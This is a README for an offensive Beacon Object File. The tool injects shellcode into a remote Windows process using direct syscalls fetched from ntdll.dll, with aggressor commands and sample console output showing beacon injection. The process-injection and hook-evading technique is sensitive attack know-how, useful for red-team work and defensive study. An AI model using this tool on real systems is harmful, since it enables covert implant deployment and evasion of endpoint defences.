## Syscalls Shellcode Injection BOF (64-bit only)

Beacon object file to:
- Fetch Syscall Stubs from on-disk ntdll.dll (All credit to @odzhan - https://github.com/odzhan/injection/blob/master/syscalls/inject_dll.c)
- Inject shellcode (either custom or beacon) into remote process using NtOpenProcess -> NtAllocateVirtualMemory -> NtWriteVirtualMemory -> NtCreateThreadEx.

Credit also to @tomcarver16 for their DLL inject BOF and aggressor script (https://github.com/tomcarver16/BOF-DLL-Inject)

## Compile

```
make
```

## Usage

Aggressor script included with the following commands:
- `syscalls_inject PID listener_name` - Injects shellcode for beacon into target PID. 
- `syscalls_shinject PID path_to_bin` - Injects custom shellcode into target PID.

> NOTE: BOF is for 64-bit use only.

### Custom shellcode
```
beacon> syscalls_shinject 2268 C:\Users\user\Desktop\beacon64.bin
[*] Syscalls Shellcode Inject (@ajpc500)
[*] Reading shellcode from: C:\Users\user\Desktop\beacon64.bin
[+] host called home, sent: 266159 bytes
[+] received output:
Shellcode injection completed successfully!
```

### Beacon shellcode
```
beacon> syscalls_inject 13764 http
[*] Syscalls Shellcode Inject (@ajpc500)
[*] Using http listener for beacon shellcode generation.
[+] host called home, sent: 266159 bytes
[+] received output:
Shellcode injection completed successfully!
```